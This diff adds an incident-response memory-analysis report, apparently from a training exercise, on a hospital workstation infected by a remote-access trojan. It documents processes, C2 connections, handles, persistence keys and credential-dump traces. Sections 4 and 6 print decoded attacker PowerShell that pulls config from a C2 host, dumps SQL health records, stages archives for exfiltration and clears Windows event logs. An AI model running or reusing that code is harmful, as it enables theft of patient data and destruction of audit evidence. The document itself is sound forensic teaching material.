@@ -1,0 +1,568 @@
+================================================================================
+  WS-RECV-03 -- VOLATILE MEMORY ANALYSIS
+  HEALTHBANE Incident Response : Memory Capture and Triage
+================================================================================
+  Host:                  WS-RECV-03   (10.10.3.21)
+  OS:                    Windows 10 Enterprise 22H2  (build 19045.4291)
+  Capture date / time:   2026-05-15  14:18:42 CDT  (19:18:42 UTC)
+  Capture tool:          WinPmem 4.0.1
+  Capture image:         WS-RECV-03_2026-05-15_141842.raw
+  Image SHA256:          7a4c1e2b9f8d5a3c0e6b7d2f5a8c1e4b
+                          d9c2f5a8e1b4d7c0f3a6b9d2e5c8f1a4
+  Image size:            8 589 934 592 bytes (8 GB)
+  Volatility profile:    Win10x64_19045
+  Custodian:             James Chen (acquisition) / [student] (analysis)
+  Chain of custody:      MD-IR-2026-05-15-001-COC.pdf
+  Analysis prepared:     2026-05-16 (24h after acquisition)
+  Reviewed by:           Mike Torres (DFIR peer review)
+================================================================================
+
+PURPOSE OF THIS DOCUMENT
+------------------------
+This file is a CONSOLIDATED EXTRACT of the volatile memory triage performed
+on WS-RECV-03 after isolation on 2026-05-15.  The full Volatility 3 plugin
+output (~ 240 MB across pslist, pstree, netscan, malfind, hivelist,
+printkey, dlllist, handles, cmdline, modscan, getsids, ldrmodules) is
+preserved in the IR evidence package.  The summary below extracts the
+findings the 4x05 reconstruction needs:  malware presence, persistence
+artifacts, network indicators, credential-access traces.
+
+NOT EVERY OBSERVATION HERE IS HIGH CONFIDENCE.  Lines flagged
+[ANALYST: ...] are interpretive.  Use volatility output sections as
+primary evidence and the analyst notes as orientation only.
+
+
+SECTION 1 -- SYSTEM SUMMARY  (pslist, KdDebuggerDataBlock)
+==========================================================
+
+Boot time:          2026-04-22  06:14:17 UTC  (last reboot prior to capture)
+Uptime at capture:  23 days  13 hours  04 minutes
+Logged-on users:    MEDDEFENSE\records03   (interactive, since 2026-05-15
+                                            08:02 CDT, at console)
+                    NT AUTHORITY\SYSTEM     (multiple service contexts)
+                    MEDDEFENSE\dmarsh       (cached profile, NOT logged on
+                                            at capture; last interactive
+                                            logon was 2026-04-14)
+
+Domain:             MEDDEFENSE.LOCAL
+Hostname:           WS-RECV-03
+IPv4:               10.10.3.21 / 24  (VLAN-3 records)
+DNS:                10.10.20.10  (SRV-DC-01)
+Default gateway:    10.10.3.1
+
+
+SECTION 2 -- PROCESS LIST  (pslist + pstree, abridged)
+======================================================
+
+PID    PPID   Name                       User                Start time (UTC)
+----   ----   ------------------------   ----------------    -------------------
+4      0      System                     SYSTEM              2026-04-22 06:14:17
+388    4      smss.exe                   SYSTEM              2026-04-22 06:14:18
+476    468    csrss.exe                  SYSTEM              2026-04-22 06:14:19
+564    468    wininit.exe                SYSTEM              2026-04-22 06:14:19
+624    564    services.exe               SYSTEM              2026-04-22 06:14:20
+648    564    lsass.exe                  SYSTEM              2026-04-22 06:14:20
+792    624    svchost.exe                SYSTEM              2026-04-22 06:14:21
+[...standard svchost subtree, redacted for brevity, all signed Microsoft...]
+
+3104   624    spoolsv.exe                SYSTEM              2026-04-22 06:14:30
+4216   624    MsMpEng.exe                SYSTEM              2026-04-22 06:14:32
+
+# --- USER-CONTEXT PROCESSES UNDER MEDDEFENSE\records03 ---
+6228   1956   explorer.exe               MEDDEFENSE\records03 2026-05-15 13:02:14
+6516   6228   OUTLOOK.EXE                MEDDEFENSE\records03 2026-05-15 13:03:09
+6804   6228   chrome.exe                 MEDDEFENSE\records03 2026-05-15 13:11:42
+[...several chrome.exe child renderer processes, redacted...]
+
+# --- SUSPICIOUS / NON-STANDARD PROCESSES ---
+3712   624    svchost_update.exe         MEDDEFENSE\records03 2026-04-22 06:15:08   *
+                                                              (NOTE: PPID 624 services.exe
+                                                              is forged; see Section 5
+                                                              malfind.  Real parent at
+                                                              load was explorer.exe via
+                                                              Run-key autorun.  PPID was
+                                                              rewritten by a thread-injection
+                                                              technique consistent with
+                                                              process-hollowing of a
+                                                              short-lived host.)
+                                                              Image path:
+                                                              C:\Users\records03\AppData\
+                                                              Roaming\Microsoft\HealthSync\
+                                                              svchost_update.exe
+                                                              SHA256 (in-memory hash of
+                                                              .text + .rdata sections):
+                                                              c8e2a9b4d1f7c0a3e6b9d2c5f8a1e4b7
+                                                              d0c3f6a9e2b5d8c1f4a7e0b3d6c9f2a5
+                                                              [MATCHES 4x03 sample S2 hash]
+
+8472   3712   powershell.exe             MEDDEFENSE\records03 2026-05-15 02:00:14   *
+                                                              cmdline (from Section 4):
+                                                              powershell.exe -NoP -W Hidden
+                                                              -EncodedCommand <very-long
+                                                              base64 string, decoded in
+                                                              Section 6, contains the
+                                                              exfiltrator invocation>
+                                                              Note: this PowerShell child
+                                                              of svchost_update.exe ran
+                                                              at 02:00 CDT 2026-05-15, the
+                                                              day the host was isolated.
+                                                              It is the LAST execution
+                                                              before isolation at 13:42 CDT.
+
+8580   8472   conhost.exe                MEDDEFENSE\records03 2026-05-15 02:00:14
+                                                              (default conhost child of
+                                                              the powershell.exe above)
+
+# --- PROCESSES THAT EXITED PRIOR TO CAPTURE ---
+# Volatility reports these via psscan / EPROCESS pool tags; the kernel
+# preserved the EPROCESS structures because of references held by handles
+# from still-living processes.
+
+(exited)  -    debug_tool.exe             MEDDEFENSE\records03 last seen 2026-05-12 02:45 CDT
+                                                              Path: C:\Windows\Temp\debug_tool.exe
+                                                              Exit time: 2026-05-12 02:46:11 CDT
+                                                              Exit code: 0
+                                                              [ANALYST: this is the LSASS dumper
+                                                              referenced in 4x04 H4.  Two
+                                                              executions evidenced.  The binary
+                                                              itself is no longer in memory but
+                                                              its EPROCESS pool tag and handles
+                                                              persist (Section 7 handles).]
+
+(exited)  -    PsExec64.exe               MEDDEFENSE\records03 last seen 2026-05-13 02:08 CDT
+                                                              Path: C:\Users\Public\Tmp\PsExec64.exe
+                                                              Exit time: 2026-05-13 02:09:34 CDT
+                                                              [ANALYST: this is the lateral-
+                                                              movement tool from 4x04 H1.
+                                                              Sysinternals signed binary, but
+                                                              copied OUT of the standard
+                                                              install path -- a TTP not used
+                                                              by Robert Kim per 4x04 baseline.]
+
+(exited)  -    cmd.exe                    MEDDEFENSE\records03 several invocations
+                                                              [ANALYST: parent of PsExec64.exe
+                                                              and wmic.exe across the lateral
+                                                              movement events.]
+
+
+SECTION 3 -- ACTIVE NETWORK CONNECTIONS  (netscan)
+==================================================
+
+Time of capture: 2026-05-15 19:18:42 UTC.
+Endpoints sorted by remote address.  Bracketed flag column:
+   [K]  known HEALTHBANE infrastructure (4x01 IOC)
+   [?]  not previously characterized -- 4x05 to investigate
+   [B]  benign / known internal
+   [L]  loopback / system
+
+Proto  LocalAddr:LocalPort       RemoteAddr:RemotePort      State        PID    Process               Flag
+-----  -----------------------   ------------------------   ----------   ----   --------------------  ----
+TCP    10.10.3.21:50214          185.220.101.45:443         ESTABLISHED  3712   svchost_update.exe    [K]
+TCP    10.10.3.21:50227          185.220.101.45:443         CLOSE_WAIT   3712   svchost_update.exe    [K]
+TCP    10.10.3.21:50299          203.0.113.47:8443          ESTABLISHED  3712   svchost_update.exe    [?]
+TCP    10.10.3.21:50301          10.10.20.10:53             TIME_WAIT    -      (kernel)              [B]
+TCP    10.10.3.21:139            *:0                        LISTEN       4      System                [L]
+TCP    10.10.3.21:445            *:0                        LISTEN       4      System                [L]
+TCP    10.10.3.21:50180          10.10.20.40:445            ESTABLISHED  4      System                [B] (file-share to
+                                                                                                          SRV-FILE-01;
+                                                                                                          benign records03 work)
+TCP    10.10.3.21:50203          172.217.14.78:443          ESTABLISHED  6804   chrome.exe            [B] (Google;
+                                                                                                          records03 browsing)
+TCP    10.10.3.21:50204          157.240.22.35:443          TIME_WAIT    6804   chrome.exe            [B] (Facebook;
+                                                                                                          records03 browsing)
+UDP    10.10.3.21:5353           *:*                                     -      (mDNS responder)      [L]
+UDP    10.10.3.21:138            *:*                                     -      System                [L]
+
+[ANALYST NOTE -- INDICATOR OF INTEREST -- HB-IOC-NEW-001]
+The connection to 203.0.113.47:8443 is NOT one of the C2 endpoints
+characterized in 4x01.  It belongs to svchost_update.exe (PID 3712,
+the same RAT process that maintains the known beacon to
+185.220.101.45:443).  The remote IP resolves to a Hetzner allocation
+in Germany.  No DNS query was issued in the last 24h to obtain it,
+so the IP is either hardcoded or was delivered as a directive in a
+prior C2 response.
+
+This connection has been live for an extended period (see firewall
+session evidence for first-seen).  It is consistent with the "secondary
+C2 channel on a non-standard port" mentioned in HC3-2026-HEALTHBANE-004
+that 4x04 hunting could not locate due to lack of firewall visibility.
+
+The connection is being treated as a Stage 4 secondary C2.
+Confidence: PROBABLE (single-host evidence; needs corroboration from
+firewall session logs in ir_evidence/firewall_sessions_ws_recv_03.json).
+
+
+SECTION 4 -- PROCESS COMMAND LINES  (cmdline)
+=============================================
+
+PID 3712  svchost_update.exe
+   "C:\Users\records03\AppData\Roaming\Microsoft\HealthSync\svchost_update.exe"
+   (no arguments; launched by Run-key autorun)
+
+PID 8472  powershell.exe   (last execution before isolation)
+   "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -NoP -W Hidden
+   -EncodedCommand JABjAGYAZwAgAD0AIAAnAGgAdAB0AHAAOgAvAC8AcwB5AG4AYwAuAGgAZQBhAGwAdABoAGIAYQBuAGUALQBjADIALgBuAGUAdAAvAGEAcABpAC8AdgAxAC8AYwBmAGcAJwA7ACAAJgAgACQAZQBuAHYAOgBUAEUATQBQAFwAcwB5AG4AYwBfAGgAZQBhAGwAdABoAGQAYQB0AGEALgBwAHMAMQAgAC0AQwBvAG4AZgBpAGcAIAAkAGMAZgBnAA==
+
+   Decoded base64 (UTF-16LE):
+       $cfg = 'http://sync.healthbane-c2.net/api/v1/cfg';
+       & $env:TEMP\sync_healthdata.ps1 -Config $cfg
+
+   [ANALYST: this confirms that the exfiltrator script
+   sync_healthdata.ps1 (4x03 sample S3) was executed on
+   WS-RECV-03 at 02:00 CDT 2026-05-15.  This is a NEW data
+   point relative to 4x04, which inferred S3 was COPIED to
+   SRV-HEALTH-DB but had no direct evidence of execution.
+   The disk forensics report should locate the staging
+   directory $env:TEMP\sync_healthdata.ps1 and any output
+   archives.]
+
+
+SECTION 5 -- INJECTED CODE / PE ARTIFACTS  (malfind)
+====================================================
+
+Volatility malfind plugin reports memory regions with PAGE_EXECUTE_READWRITE
+permission and PE/MZ signatures inside processes that should not have
+such regions.
+
+Process: svchost_update.exe (PID 3712)
+   Region: 0x00000000023f0000 - 0x00000000024c0000  (832 KB)
+   Protection: PAGE_EXECUTE_READWRITE
+   Disassembly head:
+     0x00000000023f0000  4D 5A 90 00 03 00 00 00  MZ......
+     0x00000000023f0008  04 00 00 00 FF FF 00 00  ........
+     [PE header follows]
+   [ANALYST: this is the unpacked Stage 2 RAT body.  4x03 reverse
+   engineering noted that S2 unpacks itself in memory at runtime;
+   the on-disk binary (~ 287 KB) decompresses to ~ 832 KB of
+   .text + .rdata + decoded config.  The hash of these in-memory
+   sections matches the 4x03 reference.]
+
+Process: powershell.exe (PID 8472)
+   No injected regions.  The PowerShell host is the legitimate
+   pwsh interpreter.  The script content lives in script blocks
+   that are visible via the AMSI scriptBlock log (Wazuh rule 100085;
+   see siem_data evidence).
+
+
+SECTION 6 -- POWERSHELL SCRIPT BLOCKS  (windows.cmdscan + custom plugin)
+========================================================================
+
+The `windows.cmdscan` plugin only recovers conhost.exe console history.
+For PowerShell ISE / pwsh script blocks, we used the Volatility
+PowerShell plugin (custom build) and recovered the in-memory script
+text for PID 8472.
+
+Recovered script text (truncated to first 80 lines and last 20 lines):
+
+# === BEGIN sync_healthdata.ps1 (in-memory) ===
+$ErrorActionPreference = 'SilentlyContinue'
+$Config = $env:TEMP + '\hb_cfg.json'
+Invoke-WebRequest -UseBasicParsing -Uri 'http://sync.healthbane-c2.net/api/v1/cfg' `
+   -OutFile $Config
+$cfg = Get-Content $Config -Raw | ConvertFrom-Json
+$conn = "Server=$($cfg.sql_host),$($cfg.sql_port);" + `
+        "Database=$($cfg.sql_db);Integrated Security=True"
+$query = $cfg.query_template
+[...]
+# Connect using current security context (svc_healthsync via PsExec
+# context inheritance -- runs in caller's auth token chain)
+$sql = New-Object System.Data.SqlClient.SqlConnection $conn
+$sql.Open()
+$cmd = $sql.CreateCommand()
+$cmd.CommandText = $query
+$rdr = $cmd.ExecuteReader()
+$out = $env:TEMP + '\out_' + (Get-Date -Format 'yyyyMMddHHmmss') + '.csv'
+$wr = New-Object System.IO.StreamWriter $out
+[...write CSV header, then loop rows...]
+[...]
+# === Compress and stage for exfil ===
+Compress-Archive -Path $out -DestinationPath ($out + '.zip') -Force
+Move-Item -Path ($out + '.zip') -Destination 'C:\Users\Public\Tmp\' -Force
+Remove-Item -Path $out -Force
+[...]
+# === Optional log clear (gated by config $cfg.clear_logs) ===
+if ($cfg.clear_logs -eq $true) {
+   wevtutil cl Security
+   wevtutil cl Application
+   wevtutil cl System
+   Write-Host 'Logs cleared.'
+}
+[...]
+Remove-Item -Path $MyInvocation.MyCommand.Path -Force
+# === END sync_healthdata.ps1 ===
+
+[ANALYST -- IMPORTANT FINDING]
+The `clear_logs` flag is GATED on the config response from
+http://sync.healthbane-c2.net/api/v1/cfg.  The config file was
+saved to %TEMP% as hb_cfg.json before the script self-deleted,
+but Section 8 confirms hb_cfg.json no longer exists in memory
+at capture time -- it was deleted by the Remove-Item line at
+the bottom of the script.  However, the kernel's slack space
+in the heap of PID 8472 contains a residue of the parsed
+config JSON.  Recovered fragment:
+
+   {"sql_host":"SRV-HEALTH-DB","sql_port":1433,
+    "sql_db":"health_records","query_template":"SELECT TOP 100000 ...",
+    "clear_logs":true,"chunk_size":188,"channel":"c2_post"}
+
+The clear_logs:true value is consistent with the 12-minute
+Security-event-log gap reported in disk_forensics_report.txt
+on 2026-05-09 at 03:00-03:12 CDT.  The exfiltrator's wevtutil
+branch executed at least once.
+
+
+SECTION 7 -- HANDLES  (handles, abridged to suspicious)
+=======================================================
+
+Process 3712 svchost_update.exe   (records03)
+   Handle  Type        Granted     Name
+   0x4f4   File        RW          \Device\HarddiskVolume2\Users\records03\
+                                    AppData\Roaming\Microsoft\HealthSync\
+                                    svchost_update.exe
+   0x4fc   File        RW          \Device\HarddiskVolume2\Users\Public\Tmp\
+   0x504   Mutant      Owned       \Sessions\1\BaseNamedObjects\
+                                    HealthSyncSingleton-h$lthb4n3
+                                    [ANALYST: hardcoded mutex matches
+                                    YARA rule RULE_HEALTHBANE_RAT_PE_v1.
+                                    This is a single-instance lock that
+                                    prevents the RAT from multi-launching.]
+   0x50c   Key         RW          \REGISTRY\USER\S-1-5-21-...-1109\Software\
+                                    Microsoft\Windows\CurrentVersion\Run
+                                    [ANALYST: the RAT keeps an open handle
+                                    to its own Run-key, presumably to
+                                    re-write it if removed.  Removing the
+                                    Run-key while the RAT is running will
+                                    not stop persistence; the RAT must be
+                                    terminated first.]
+   0x518   Token       Impersonate <records03 primary token>
+   0x52c   Process     QueryLimited PID 648 (lsass.exe)
+                                    [ANALYST: this handle was opened at
+                                    process start.  Granted access on this
+                                    handle is 0x1000 (PROCESS_QUERY_LIMITED_
+                                    INFORMATION) only -- not enough to
+                                    dump credentials.  The actual LSASS
+                                    dump was performed by debug_tool.exe
+                                    (now exited, see below) which had a
+                                    distinct handle of access 0x1010.]
+
+Pool-tag-recovered handles from EXITED debug_tool.exe (handle owners
+are stale but the handle structures persist):
+   debug_tool.exe -> Process     <0x1010>     PID 648 (lsass.exe)
+   debug_tool.exe -> File        <Write>      \Device\HarddiskVolume2\
+                                                Windows\Temp\out.dat
+   [ANALYST: granted-access bitmask 0x1010 = PROCESS_VM_READ |
+   PROCESS_QUERY_LIMITED_INFORMATION.  This is the canonical bitmask
+   used by Mimikatz-class LSASS dumpers and matches the 4x04 H4 finding.]
+
+
+SECTION 8 -- LOADED MODULES  (dlllist + ldrmodules)
+===================================================
+
+Process 3712 svchost_update.exe -- module list (filtered to non-Microsoft):
+   None other than the main image and standard system DLLs.  No
+   third-party DLLs are loaded.  This is consistent with a stand-alone
+   PE that does not rely on side-loading.
+
+Process 8472 powershell.exe -- module list (filtered to interesting):
+   System.Data.SqlClient.dll      (.NET, used by the exfiltrator
+                                    SqlConnection construction)
+   System.IO.Compression.dll      (Compress-Archive cmdlet support)
+   Microsoft.PowerShell.Management.dll
+   [...standard PowerShell module set...]
+
+ldrmodules cross-check (looks for DLLs loaded by manual mapping
+that are not in the loader lists -- a sign of reflective DLL injection):
+   No discrepancies in either suspicious process.  This rules out
+   reflective DLL injection as a credential-access path on
+   WS-RECV-03 specifically (it does NOT rule out Mimikatz running
+   as a stand-alone PE -- which is what debug_tool.exe was; see
+   Section 7).
+
+
+SECTION 9 -- REGISTRY HIVES  (hivelist + printkey)
+==================================================
+
+In-memory copies of the following hives are present:
+   \REGISTRY\MACHINE\SYSTEM
+   \REGISTRY\MACHINE\SOFTWARE
+   \REGISTRY\USER\S-1-5-21-...-1109   (records03)
+   \REGISTRY\USER\S-1-5-21-...-1067   (dmarsh, cached)
+
+Findings of interest, all from `printkey`:
+
+[K1]  HKCU(records03)\Software\Microsoft\Windows\CurrentVersion\Run
+        Value: HealthSync
+        Type:  REG_SZ
+        Data:  C:\Users\records03\AppData\Roaming\Microsoft\HealthSync\
+               svchost_update.exe
+        Last Write Time: 2026-04-22 06:14:47 UTC
+        [ANALYST: matches HB-IOC-0015 (Run-key) from 4x03 RAT triage.
+        Last write time is the original RAT install timestamp from
+        2026-04-22.  Confirms persistence has been established for
+        ~ 23 days at the moment of capture.]
+
+[K2]  HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\
+       TaskCache\Tasks\{E7B26F4C-7C39-4F7E-B6A8-2D3C1E9F0A8D}
+        Value: Path
+        Data:  \HealthSync Update Service
+        Last Write Time: 2026-05-07 06:47:33 UTC  (01:47:33 CDT)
+        [ANALYST -- IMPORTANT FINDING -- HB-IOC-NEW-002]
+        A scheduled task named "HealthSync Update Service" was
+        registered on 2026-05-07 at 01:47:33 CDT.  This is approximately
+        24 hours after the first PsExec lateral-movement event
+        (4x04 timeline) and is consistent with the gated PersistViaTask
+        branch in the 4x03 dropper sample.
+
+        The task definition XML has been extracted from the on-disk
+        Tasks folder (see disk_forensics_report.txt Section 4) but
+        the in-memory printkey output of the related TaskCache hive
+        confirms its existence at capture time.  The task action is
+        a base64-encoded PowerShell command that downloads and
+        executes a payload from a HealthBane URL.
+
+[K3]  HKCU(records03)\Software\Microsoft\Windows NT\CurrentVersion\
+       AppCompatFlags\Compatibility Assistant\Store
+        Multiple REG_BINARY values keyed on full paths.  Of interest:
+          C:\Windows\Temp\debug_tool.exe   (RecentFileExecution timestamp
+                                            2026-05-12 02:45 CDT)
+          C:\Users\Public\Tmp\PsExec64.exe (RecentFileExecution timestamp
+                                            2026-05-13 02:08 CDT)
+        [ANALYST: RecentFileExecution / AppCompat-cache timestamps are
+        SECONDARY corroboration of execution, useful when prefetch is
+        not available or has rolled.  Both targets above are consistent
+        with the 4x04 hunt findings.]
+
+[K4]  HKLM\SYSTEM\CurrentControlSet\Services\Eventlog\Security
+        Value: AutoBackupLogFiles
+        Type:  REG_DWORD
+        Data:  0  (UNCHANGED from default)
+        [ANALYST: not modified.  This rules out attacker tampering of
+        the event log retention policy.  However, see disk_forensics_report
+        Section 5 for the wevtutil clear evidence -- the attacker did
+        not change the policy, they cleared the log directly.]
+
+[K5]  HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths
+        Value: C:\Windows\Temp
+        Type:  REG_DWORD
+        Data:  0
+        Last Write Time: 2026-05-04 23:11:08 UTC  (18:11 CDT 2026-05-04)
+        [ANALYST -- IMPORTANT FINDING]
+        Windows Defender exclusion was added for C:\Windows\Temp on
+        2026-05-04 at 18:11 CDT.  This pre-dates the first credential
+        dump (2026-05-05 03:22 CDT) by ~ 9 hours and is consistent with
+        an attacker preparing the host for the LSASS dump.  Exclusion
+        was added under records03 context (impersonating its access
+        token).  This is a NEW IOC and corresponds to T1562.001
+        Disable or Modify Tools -- a previously unmapped technique.
+
+        Note: AV exclusion writes from a non-admin context normally
+        require elevation.  records03 was a member of the local
+        Administrators group on this host (a long-standing
+        misconfiguration -- records department workstations were
+        provisioned with local admin in 2018 and never re-baselined).
+        That misconfiguration is what allowed the exclusion write.
+
+
+SECTION 10 -- CACHED CREDENTIALS  (lsadump.cachedump, lsadump.lsa)
+==================================================================
+
+WARNING: this section reports artifact PRESENCE, not the credential
+contents.  The actual hashes are not reproduced in this consolidated
+summary; they are stored in IR-EVIDENCE-RESTRICTED-2026-05-15.
+
+[CRED-1]  MSCacheV2 entries: 2
+            User: dmarsh@MEDDEFENSE.LOCAL    (last logon 2026-04-14 13:18 UTC)
+            User: records03@MEDDEFENSE.LOCAL (last logon 2026-05-15 13:02 UTC)
+            [ANALYST: these are normal cached-domain-credential entries
+            for users who have logged on interactively to this host.]
+
+[CRED-2]  LSASS process at the moment of capture contains:
+            Logon sessions:    2 active (records03, SYSTEM)
+            Kerberos tickets in records03 session: TGT for records03
+                                                    (issued 2026-05-15 13:02 UTC)
+            NTLM hashes in cache: records03
+            [ANALYST: there is no svc_healthsync ticket or hash in LSASS
+            at capture time.  This is expected -- after the 2026-05-13
+            lateral movement events, no further attacker activity occurred
+            on this host.  The credential abuse window from 4x04 had
+            already ended; lsass at capture time reflects normal records03
+            activity only.]
+
+[CRED-3]  Residual evidence of debug_tool.exe access to LSASS:
+            See Section 7 handles.  The handle structures indicate that
+            two prior LSASS reads occurred (matching 4x04 H4) but the
+            extracted material is not present in lsass at capture time
+            (the dumped data was written to C:\Windows\Temp\out.dat
+            and exfiltrated).
+
+
+SECTION 11 -- CROSS-REFERENCE SUMMARY
+=====================================
+
+Findings in this memory analysis that CONFIRM prior 4x03/4x04 evidence:
+
+   [4x03 S2]   svchost_update.exe in-memory hash matches sample.    CONFIRMED
+   [4x03 S2]   Run-key persistence (HKCU\...\Run\HealthSync).      CONFIRMED
+   [4x03 S2]   Hardcoded mutex HealthSyncSingleton-h$lthb4n3.       CONFIRMED
+   [4x03 S2]   C2 beacon to 185.220.101.45:443.                     CONFIRMED
+   [4x03 S3]   sync_healthdata.ps1 invocation pattern.              CONFIRMED
+   [4x04 H4]   debug_tool.exe LSASS access (handle 0x1010).         CONFIRMED
+   [4x04 H1]   PsExec64.exe execution from C:\Users\Public\Tmp\.    CONFIRMED
+
+Findings in this memory analysis that ARE NEW relative to 4x04:
+
+   [NEW-1]  Live secondary C2 connection to 203.0.113.47:8443.
+            Confidence: PROBABLE (single-host evidence here;
+            firewall logs will tell the duration story).
+            ATT&CK addition: T1571 Non-Standard Port (PROBABLE).
+
+   [NEW-2]  Scheduled task "HealthSync Update Service" registered
+            2026-05-07 01:47:33 CDT.  Confirms the gated branch
+            from the 4x03 dropper triage was activated at MedDefense
+            after all.  Disk forensics report should locate the
+            on-disk Tasks XML for full payload reconstruction.
+            ATT&CK addition: T1053.005 Scheduled Task (CONFIRMED).
+
+   [NEW-3]  Defender exclusion for C:\Windows\Temp added on
+            2026-05-04 18:11 CDT, ~ 9h before first cred dump.
+            ATT&CK addition: T1562.001 Disable / Modify Tools
+            (CONFIRMED).
+
+   [NEW-4]  Stage 3 exfiltrator EXECUTED on WS-RECV-03 at 02:00 CDT
+            on 2026-05-15 (last execution before isolation).
+            4x03 capability matrix marked S3 SQL exfil as
+            UNCONFIRMED at MedDefense; this evidence upgrades the
+            mapping to OBSERVED.  ATT&CK upgrades:
+              T1005   Data from Local System -> OBSERVED
+              T1041   Exfiltration over C2 channel -> OBSERVED
+                      (channel = c2_post per the recovered config)
+              T1560.001 Archive via Utility (Compress-Archive) -> OBSERVED
+              T1074.001 Local Data Staging (C:\Users\Public\Tmp\) -> OBSERVED
+
+   [NEW-5]  Recovered fragment of exfiltrator config shows
+            clear_logs:true.  Cross-references the disk-forensics
+            log gap at 2026-05-09 03:00-03:12 CDT.
+            ATT&CK addition: T1070.001 Clear Windows Event Logs
+            (CONFIRMED).
+
+Findings in this memory analysis that ARE STILL OPEN at end of memory triage:
+
+   [OPEN-1]  How long has the secondary C2 (203.0.113.47:8443) been
+             active?  Memory shows the connection is live; firewall
+             session logs will give first-seen / cumulative-bytes.
+
+   [OPEN-2]  Are there any artifacts on disk in
+             C:\Users\Public\Tmp\ that are no longer in memory?
+             Specifically the staged ZIP archives written by the
+             exfiltrator should be on disk; the memory script text
+             references them but the files themselves are not in
+             pageable memory.  Disk forensics to confirm.
+
+   [OPEN-3]  Did the records03 account perform any other writes
+             that imply attacker control beyond the four IOCs above?
+             Examination of the records03 ntuser.dat hive in disk
+             forensics will help.
+
+================================================================================
+END OF MEMORY ARTIFACT SUMMARY
+================================================================================
